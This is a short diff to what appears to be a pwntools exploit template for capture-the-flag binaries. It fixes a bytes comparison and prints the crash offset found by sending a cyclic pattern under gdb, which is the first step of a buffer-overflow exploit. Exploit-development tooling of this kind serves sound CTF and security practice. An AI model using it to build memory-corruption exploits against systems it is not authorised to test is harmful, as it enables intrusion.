@@ -44,13 +44,13 @@ if GDB and not REMOTETTCP and not REMOTESSH:
 #### Find offset ###
 ####################
 OFFSET = b""#b"A"*72
-if OFFSET == "":
+if OFFSET == b"":
     gdb.attach(p.pid, "c") #Attach and continue
     payload = cyclic(1000)
     print(p.clean())
     p.sendline(payload)
     #x/wx $rsp -- Search for bytes that crashed the application
-    #cyclic_find(0x6161616b) # Find the offset of those bytes
+    #print(f"Offset: {cyclic_find(0x6161616b)}") # Find the offset of those bytes
     p.interactive()
     exit()
 
